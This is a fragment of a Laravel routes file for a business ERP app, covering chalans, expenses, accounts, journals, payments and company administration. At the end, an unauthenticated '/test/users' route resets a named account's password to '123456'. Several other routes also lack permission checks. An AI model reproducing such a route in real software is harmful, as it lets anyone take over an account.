        Route::get('/purchase-sales/get-goods', 'PurchaseSalesController@getJsonGoodsForPurchaseSale')
            ->name('purchaseSales.getJsonGoodsForPurchaseSale')
            ->middleware('can:purchase-sales-order-create');

        Route::get('/purchase-sales/get-rem-goods', 'PurchaseSalesController@getJsonRemGoodsForPurchaseSale')
            ->name('purchaseSales.getJsonRemGoodsForPurchaseSale');

        Route::get('/purchase-sales/get-customers', 'PurchaseSalesController@getJsonCustomersForPurchaseSale')
            ->name('purchaseSales.getJsonCustomersForPurchaseSale')
            ->middleware('can:purchase-sales-order-create');

        Route::get('/create-purchase-sales-order',[
            'uses'  => 'PurchaseSalesController@create',
            'as'    => 'create-purchase-sales-order'
        ])->middleware('can:purchase-sales-order-create');

        Route::post('/store-purchase-sales-order',[
            'uses'  => 'PurchaseSalesController@store',
            'as'    => 'store-purchase-sales-order'
        ])->middleware('can:purchase-sales-order-create');

        Route::get('/download-purchase-sales-order/{id}',[
            'uses'  => 'PurchaseSalesController@download',
            'as'    => 'download-purchase-sales-order'
        ])->middleware('can:purchase-sales-order-download');

        Route::get('/delete-purchase-sales-order/{id}',[
            'uses'  => 'PurchaseSalesController@delete',
            'as'    => 'delete-purchase-sales-order'
        ])->middleware('can:purchase-sales-order-delete');

        /**
         * Sales Order Chalan
         */

        Route::get('chalans',[
            'uses'  => 'SalesChalanController@index',
            'as'    => 'chalans'
        ])->middleware('can:sales-chalans-show');

        Route::get('chalan/{id}',[
            'uses'  => 'SalesChalanController@getChalan',
            'as'    => 'get-chalan'
        ])->middleware('can:sales-chalan-show');

        Route::get('create-chalan',[
            'uses'  => 'SalesChalanController@create',
            'as'    => 'create-chalan'
        ])->middleware('can:sales-chalan-create');

        Route::post('create-chalan',[
            'uses'  => 'SalesChalanController@store',
            'as'    => 'store-chalan'
        ])->middleware('can:sales-chalan-create');

        Route::get('sales-order/items/{id}',[
            'uses'  => 'SalesChalanController@getSalesOrderItems',
            'as'     => 'sales-order-items'
        ])->middleware('can:sales-order-items-show');

        Route::get('/download-sales-chalan/{id}',[
            'uses'  => 'SalesChalanController@download',
            'as'    => 'download-sales-chalan'
        ])->middleware('can:sales-chalan-download');

        Route::get('/download-sales-chalan-bill/{id}',[
            'uses'  => 'SalesChalanController@billDownload',
            'as'    => 'download-sales-chalan-bill'
        ])->middleware('can:sales-chalan-bill-download');

        /**
         * Sales Order Return Chalan
         */

        Route::get('/return-chalans',[
            'uses'  => 'SalesReturnChalanController@index',
            'as'    => 'return-chalans'
        ])->middleware('can:sales-return-chalans-show');

        Route::get('/return-chalan/{id}',[
            'uses'  => 'SalesReturnChalanController@getChalan',
            'as'    => 'get-return-chalan'
        ])->middleware('can:sales-return-chalan-show');

        Route::get('/create-return-chalan',[
            'uses'  => 'SalesReturnChalanController@create',
            'as'    => 'create-return-chalan'
        ])->middleware('can:sales-return-chalan-create');

        Route::post('create-return-chalan',[
            'uses'  => 'SalesReturnChalanController@store',
            'as'    => 'store-return-chalan'
        ])->middleware('can:sales-return-chalan-create');

        Route::get('/download-sales-return-chalan/{id}',[
            'uses'  => 'SalesReturnChalanController@download',
            'as'    => 'download-sales-return-chalan'
        ])->middleware('can:sales-return-chalan-download');



        /**
         * Purchase Sales Order Chalan
         */

        Route::get('purchase-sales-chalans',[
            'uses'  => 'PurchaseSalesChalanController@index',
            'as'    => 'purchase-sales-chalans'
        ])->middleware('can:purchase-sales-chalans-show');

        Route::get('purchase-sales-chalan/{id}',[
            'uses'  => 'PurchaseSalesChalanController@getChalan',
            'as'    => 'purchase-sales-get-chalan'
        ])->middleware('can:purchase-sales-chalan-show');

        Route::get('purchase-sales-create-chalan',[
            'uses'  => 'PurchaseSalesChalanController@create',
            'as'    => 'purchase-sales-create-chalan'
        ])->middleware('can:purchase-sales-chalan-create');

        Route::post('purchase-sales-create-chalan',[
            'uses'  => 'PurchaseSalesChalanController@store',
            'as'    => 'purchase-sales-store-chalan'
        ])->middleware('can:purchase-sales-chalan-create');

        Route::get('purchase-sales-sales-order/items/{id}',[
            'uses'  => 'PurchaseSalesChalanController@getSalesOrderItems',
            'as'     => 'purchase-sales-sales-order-items'
        ])->middleware('can:purchase-sales-order-items-show');

        Route::get('/purchase-sales-download-sales-chalan/{id}',[
            'uses'  => 'PurchaseSalesChalanController@download',
            'as'    => 'purchase-sales-download-sales-chalan'
        ])->middleware('can:purchase-sales-chalan-download');

        /**
         * Purchase Sales Order Return Chalan
         */

        Route::get('/purchase-sales-return-chalans',[
            'uses'  => 'PurchaseSalesReturnChalanController@index',
            'as'    => 'purchase-sales-return-chalans'
        ])->middleware('can:purchase-sales-return-chalans-show');

        Route::get('/purchase-sales-return-chalan/{id}',[
            'uses'  => 'PurchaseSalesReturnChalanController@getChalan',
            'as'    => 'purchase-sales-get-return-chalan'
        ])->middleware('can:purchase-sales-return-chalan-show');

        Route::get('/purchase-sales-create-return-chalan',[
            'uses'  => 'PurchaseSalesReturnChalanController@create',
            'as'    => 'purchase-sales-create-return-chalan'
        ])->middleware('can:purchase-sales-return-chalan-create');

        Route::post('purchase-sales-create-return-chalan',[
            'uses'  => 'PurchaseSalesReturnChalanController@store',
            'as'    => 'purchase-sales-store-return-chalan'
        ])->middleware('can:purchase-sales-return-chalan-create');

        Route::get('/purchase-sales-download-sales-return-chalan/{id}',[
            'uses'  => 'PurchaseSalesReturnChalanController@download',
            'as'    => 'purchase-sales-download-sales-return-chalan'
        ])->middleware('can:purchase-sales-return-chalan-download');

        /**
         * Summary Type
         */

        Route::get('/summary-types', [
            'uses' => 'SummaryTypeController@index',
            'as' => 'summary-types'
        ])->middleware('can:summary-types-show');//show all summary type

        Route::post('/summary-types', [
            'uses' => 'SummaryTypeController@store',
            'as' => 'summary-types.create'
        ])->middleware('can:summary-type-create'); //store summary type

        Route::get('/summary-types/{id}',[
            'uses' => 'SummaryTypeController@getJsonSummaryType',
            'as' => 'summary-types.edit'
        ])->middleware('can:summary-type-edit');

        Route::post('/summary-types/{id}',[
            'uses' => 'SummaryTypeController@update',
            'as' => 'summary-types.edit'
        ])->middleware('can:summary-type-edit');

        Route::delete('/summary-types/{customer}', 'SummaryTypeController@destroy')
            ->name('summary-types.destroy')
            ->middleware('can:summary-type-delete');// delete a particular customer.


        /**
         * Summary
        */
        Route::get('/summaries', [
            'uses' => 'SummaryController@index',
            'as' => 'summaries'
        ])->middleware('can:summaries-show');

        Route::post('/summaries', [
            'uses' => 'SummaryController@store',
            'as' => 'summaries.create'
        ])->middleware('can:summary-create'); //store summary type

        Route::get('/summaries/downloads', 'SummaryController@downloads')
            ->name('summaries.downloads')
            ->middleware('can:summaries-download');

        /**
         * Expense Head
         */

        Route::get('/expense-heads', [
            'uses' => 'ExpenseHeadController@index',
            'as' => 'expense-heads'
        ])->middleware('can:expense-heads-show');

        Route::get('/expense-head/{id}', function ($company_id,$id) {
            $expense_head = \App\Model\ExpenseHead::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($expense_head, 200);
        })->name('expense-head');

        Route::post('/expense-head/{id}', [
            'uses' => 'ExpenseHeadController@update',
            'as' => 'expense-head'
        ])->middleware('can:expense-head-edit');

        Route::post('/expense-head', [
            'uses' => 'ExpenseHeadController@store',
            'as' => 'create-expense-head'
        ])->middleware('can:expense-head-create');


        Route::get('/delete-expense-head/{id}', [
            'uses' => 'ExpenseHeadController@delete',
            'as' => 'delete-expense-head'
        ])->middleware('can:expense-head-delete');


        /**
         * Expense Head
         */

        Route::get('/expenses', [
            'uses' => 'ExpenseController@index',
            'as' => 'expenses'
        ])->middleware('can:expenses-show');


        Route::get('/expense/{id}', function ($company_id,$id) {
            $expense_head = \App\Model\Expense::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($expense_head, 200);
        })->name('expense');

        Route::post('/expense/{id}', [
            'uses' => 'ExpenseController@update',
            'as' => 'expense'
        ])->middleware('can:expense-edit');


        Route::post('/expense', [
            'uses' => 'ExpenseController@store',
            'as' => 'create-expense'
        ])->middleware('can:expense-create');

        Route::get('/delete-expense/{id}', [
            'uses' => 'ExpenseController@delete',
            'as' => 'delete-expense'
        ])->middleware('can:expense-delete');
        /**
         * Accounts
         */

        Route::get('/account-setting',[
            'uses'  => 'AccountsSettingController@index',
            'as'    => 'account-setting'
        ]);

        Route::post('/update/account-setting',[
            'uses'  => 'AccountsSettingController@update',
            'as'    => 'update-account-setting'
        ]);

        Route::get('/accounts', [
            'uses' => 'AccountController@index',
            'as' => 'accounts'
        ])->middleware('can:accounts-show');

        Route::get('/account/{id}', function ($company_id,$id) {
            $account = \App\Model\Account::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($account, 200);
        })->name('account');

        Route::post('/account/{id}', [
            'uses' => 'AccountController@update',
            'as' => 'account'
        ])->middleware('can:account-edit');

        Route::post('/account', [
            'uses' => 'AccountController@store',
            'as' => 'create-account'
        ])->middleware('can:account-create');

        Route::get('/delete-account/{id}', [
            'uses' => 'AccountController@delete',
            'as' => 'delete-account'
        ])->middleware('can:account-delete');
        /**
         * Journal
         */

        Route::get('/journals',[
            'uses'  => 'JournalController@index',
            'as'    => 'journals'
        ])->middleware('can:journal-entries-show');

        Route::post('/get-journal-entries',[
            'uses'  => 'JournalController@getJournals',
            'as'    => 'get-journal-entries'
        ])->middleware('can:journal-entries-show');

        Route::get('/get-journal-entries',[
            'uses'  => 'JournalController@downloadJournals',
            'as'    => 'download-journal-entries'
        ])->middleware('can:journal-entries-show');

        Route::get('/crate-journal',[
            'uses'  => 'JournalController@create',
            'as'    => 'create-journal'
        ])->middleware('can:journal-entries-create');

        Route::post('/store-journal',[
            'uses'  => 'JournalController@store',
            'as'    => 'store-journal'
        ])->middleware('can:journal-entries-create');

        Route::get('/show-journal/{id}',[
            'uses'  => 'JournalController@show',
            'as'    => 'show-journal'
        ])->middleware('can:journal-entries-show');

        Route::get('/edit-journal/{id}',[
            'uses'  => 'JournalController@edit',
            'as'    => 'edit-journal'
        ])->middleware('can:journal-entries-edit');

        Route::post('/edit-journal/{id}',[
            'uses'  => 'JournalController@update',
            'as'    => 'update-journal'
        ])->middleware('can:journal-entries-edit');

        Route::get('/delete-journal/{id}',[
            'uses'  => 'JournalController@delete',
            'as'    => 'delete-journal'
        ])->middleware('can:journal-entries-delete');

        /**
         * Ledger
         */

        Route::get('/ledger/{id}',[
            'uses'  => 'LedgerController@getLedger',
            'as'    => 'show-ledger'
        ])->middleware('can:ledger-show');

        Route::get('/download-ledger/{id}',[
            'uses'  => 'LedgerController@download',
            'as'    => 'download-ledger'
        ])->middleware('can:ledger-download');

        /**
         * Account Closing
         */
        Route::get('/account-closings',[
            'uses'  => 'AccountClosingController@index',
            'as'    => 'account-closings'
        ])->middleware('can:show-account-closings');

        Route::get('/create-account-closing',[
            'uses'  => 'AccountClosingController@create',
            'as'    => 'create-account-closing'
        ])->middleware('can:create-account-closing');

        Route::get('/check-account-closing/{year}',[
            'uses'  => 'AccountClosingController@check',
            'as'    => 'check-account-closing'
        ])->middleware('can:create-account-closing');

        Route::post('/create-account-closing/{year}',[
            'uses'  => 'AccountClosingController@store',
            'as'    => 'store-account-closing'
        ])->middleware('can:create-account-closing');

        /**
         * Trial Balance
         */
        Route::get('/trial-balance',[
            'uses'  => 'TrialBalanceController@index',
            'as'    => 'trial-balance'
        ])->middleware('can:trial-balance-show');

        Route::get('/download-trial-balance',[
            'uses'  => 'TrialBalanceController@download',
            'as'    => 'download-trial-balance'
        ])->middleware('can:trial-balance-download');

        Route::get('/account-statements',[
            'uses'  => 'AccountStatementController@index',
            'as'    => 'account-statements'
        ]);

        Route::post('/get/account-statements',[
            'uses'  => 'AccountStatementController@getStatements',
            'as'    => 'get-account-statements'
        ]);

        Route::get('/get/account-statements',[
            'uses'  => 'AccountStatementController@downloadStatements',
            'as'    => 'download-account-statements'
        ]);

        /**
         * Inter Company Transaction
         */

        Route::get('/transactions',[
            'uses'  => 'TransactionController@index',
            'as'    => 'transactions'
        ])->middleware('can:transactions-show');

        Route::get('/create-transaction',[
            'uses'  => 'TransactionController@create',
            'as'    => 'create-transaction'
        ])->middleware('can:transaction-show');

        Route::post('/store-transaction',[
            'uses'  => 'TransactionController@store',
            'as'    => 'store-transaction'
        ])->middleware('can:transaction-create');

        Route::get('/approve-transaction/{id}',[
            'uses'  => 'TransactionController@approve',
            'as'    => 'approve-transaction'
        ])->middleware('can:transaction-approve');

        Route::post('/approve-transaction/{id}',[
            'uses'  => 'TransactionController@confirmApproval',
            'as'    => 'post-approve-transaction'
        ])->middleware('can:transaction-post-approve');


        /**
         * Purchase Payments
         */

        Route::get('/purchase-payments',[
            'uses'  => 'PurchasePaymentController@index',
            'as'    => 'purchase-payments'
        ])->middleware('can:purchase-payments-show');

        Route::get('/create-purchase-payment',[
            'uses'  => 'PurchasePaymentController@create',
            'as'    => 'create-purchase-payment'
        ])->middleware('can:purchase-payment-create');

        Route::post('/create-purchase-payment',[
            'uses'  => 'PurchasePaymentController@store',
            'as'    => 'store-purchase-payment'
        ])->middleware('can:purchase-payment-create');

        /**
         * Sales Payments
         */

        Route::get('/sales-payments',[
            'uses'  => 'SalesPaymentController@index',
            'as'    => 'sales-payments'
        ])->middleware('can:sales-payments-show');

        Route::get('/sales-payments/{id}', 'SalesPaymentController@show')
            ->name('salesPayments.show')
            ->middleware('can:sales-payments-show');

        Route::get('/create-sales-payment',[
            'uses'  => 'SalesPaymentController@create',
            'as'    => 'create-sales-payment'
        ])->middleware('can:sales-payment-create');

        Route::post('/create-sales-payment',[
            'uses'  => 'SalesPaymentController@store',
            'as'    => 'store-sales-payment'
        ])->middleware('can:sales-payment-create');

    });
});


Auth::routes();

Route::get('/', 'HomeController@index')->name('default');
Route::get('/home', 'HomeController@index')->name('home');
//Route::get('/home/parches-overview', 'HomeController@parchesOverview')->name('parchesOverview');

Route::group(['middleware' => ['auth'],'prefix' => 'admin'], function () {
    /**
     * Companies
     */

    Route::get('/companies',[
        'uses'  => 'CompanyController@index',
        'as'    => 'companies'
    ]);


    Route::get('/company/{id}',[
        'uses'  => 'CompanyController@show',
        'as'    => 'show-company'
    ]);

    Route::get('/edit-company/{id}',[
        'uses'  => 'CompanyController@edit',
        'as'    => 'edit-company'
    ]);

    Route::post('/update-company/{id}',[
        'uses'  => 'CompanyController@update',
        'as'    => 'update-company'
    ]);

    Route::group(['middleware' => 'super.admin'],function(){
        Route::get('/create-company',[
            'uses'  => 'CompanyController@create',
            'as'    => 'create-company'
        ]);


        Route::post('/create-company',[
            'uses'  => 'CompanyController@store',
            'as'    => 'store-company'
        ]);

        Route::get('/delete-company/{id}',[
            'uses'  => 'CompanyController@delete',
            'as'    => 'delete-company'
        ]);


        Route::post('/admin',[
            'uses'  => 'CompanyController@getAdmins',
            'as'    => 'get-admins'
        ]);

        Route::post('/update/company/user/password',[
            'uses'  => 'CompanyController@updatePassword',
            'as'    => 'update-company-user-pass'
        ]);


        /**
         * Find Existing User
         */

        Route::post('/search/user',[
            'uses'  => 'CompanyController@findUser',
            'as'    => 'search-user'
        ]);
    });

    /**
     * Logout
     */

    Route::get('/logout',function(){
        Auth::logout();
        return redirect()->route('login');
    })->name('logout');

});


Route::get('import-permission',function(){
    $array =[

        "roles-show",
        "role-create",
        "role-edit",
        "role-delete",
        "users-show",
        "user-create",
        "user-edit",
        "user-delete",
        "units-show",
        "unit-create",
        "unit-edit",
        "unit-delete",
        "raw-materials-show",
        "raw-material-create",
        "raw-material-edit",
        "raw-material-delete",
        "inventory-raw-materials-show",
        "inventory-other-materials-show",
        "inventory-logs-materials-show",
        "inventory-ready-for-sale-goods-show",
        "designations-show",
        "designation-create",
        "designation-edit",
        "designation-delete",
        "leave-types-show",
        "leave-type-create",
        "leave-type-edit",
        "leave-type-delete",
        "employees-show",
        "employee-create",
        "employee-edit",
        "employee-delete",
        "attendances-show",
        "attendance-create",
        "roster-create",
        "roster-delete",
        "categories-show",
        "category-create",
        "category-edit",
        "category-delete",
        "grades-show",
        "grade-create",
        "grade-edit",
        "grade-delete",
        "vendors-show",
        "vendor-create",
        "vendor-edit",
        "vendor-delete",


//        log-purchase-orders

        "log-purchase-order-create",
        "log-purchase-orders-show",
        "log-purchase-order-show",
        "log-purchase-order-edit",
        "log-purchase-order-delete",
        "log-purchase-orders-download",
        "log-purchase-order-download",

//        material-purchase-order

        "material-purchase-order-create",
        "material-purchase-orders-show",
        "material-purchase-order-show",
        "material-purchase-order-edit",
        "material-purchase-order-delete",
        "material-purchase-orders-download",
        "material-purchase-order-download",

//        "purchase-orders-show",
//        "purchase-order-show",
//        "purchase-order-create",
//        "purchase-order-edit",
//        "purchase-order-delete",
        "goods-show",
        "goods-create",
        "goods-edit",
        "goods-delete",
        "productions-show",
        "production-create",
        "production-edit",
        "production-delete",
        "produced-goods-show",
        "sales-orders-show",
        "sales-order-create",
        "sales-order-edit",
        "sales-order-delete",
        "sales-chalans-show",
        "sales-chalan-create",
        "sales-chalan-edit",
        "sales-chalan-delete",
        "sales-chalan-download",
        "sales-return-chalans-show",
        "sales-return-chalan-create",
        "sales-return-chalan-edit",
        "sales-return-chalan-delete",
        "purchase-sales-orders-show",
        "purchase-sales-order-create",
        "purchase-sales-order-edit",
        "purchase-sales-order-delete",
        "purchase-sales-chalans-show",
        "purchase-sales-chalan-create",
        "purchase-sales-chalan-edit",
        "purchase-sales-chalan-delete",
        "purchase-sales-return-chalans-show",
        "purchase-sales-return-chalan-create",
        "purchase-sales-return-chalan-edit",
        "purchase-sales-return-chalan-delete",
        "payment-types-show",
        "payment-type-create",
        "payment-type-edit",
        "payment-type-delete",
        "view-extra-fields-show",
        "view-extra-field-create",
        "view-extra-field-edit",
        "view-extra-field-delete",
        "sales-payments-show",
        "sales-payment-create",
        "purchase-payments-show",
        "purchase-payment-create",
        "expense-heads-show",
        "expense-head-create",
        "expense-head-edit",
        "expense-head-delete",
        "expenses-show",
        "expense-create",
        "expense-edit",
        "expense-delete",
        "accounts-show",
        "account-create",
        "account-edit",
        "account-delete",
        "journal-entries-show",
        "journal-entries-create",
        "journal-entries-edit",
        "journal-entries-delete",
        "transactions-show",
        "transaction-create",
        "transaction-approve",
        "transaction-post-approve",
        "trial-balance-show",
        "trial-balance-download",
        "income-statement-show",
        "income-statement-download",
        "purchase-order-update",
        "vendor-profile-show",
        "sales-order-delete",
        "sales-chalan-bill-download",
        "chalan-show",
        "purchase-sales-order-show",
        "purchase-sales-order-download",
        "purchase-sales-chalan-download",
        "sales-order-show",
        "show-account-closings",
        "create-account-closing",
        "customers-show",
        "customer-create",
        "customer-edit",
        "customer-delete",
        "customer-profile-show",
        "summary-types-show",
        "summary-type-create",
        "summary-type-edit",
        "summary-type-delete",
        "summaries-show",
        "summary-create",
        "summaries-download",
        "show-sales-orders-report",
        "download-sales-orders-report",


    ];

    $permissions = [];

    foreach ($array as $v){
        $name_array = explode('-',$v);
        $name = implode(' ',$name_array);
        $permissions[] = \App\Model\Permission::firstOrCreate([
            'name'  => ucfirst($name),
            'slug'  => $v,
        ]);
    }

    return $permissions;
});

Route::get('/test/users',function(){
    return \App\User::where('email','info@royalbdgroup.com')->update([
        'password'  => bcrypt(123456)
    ]);
});
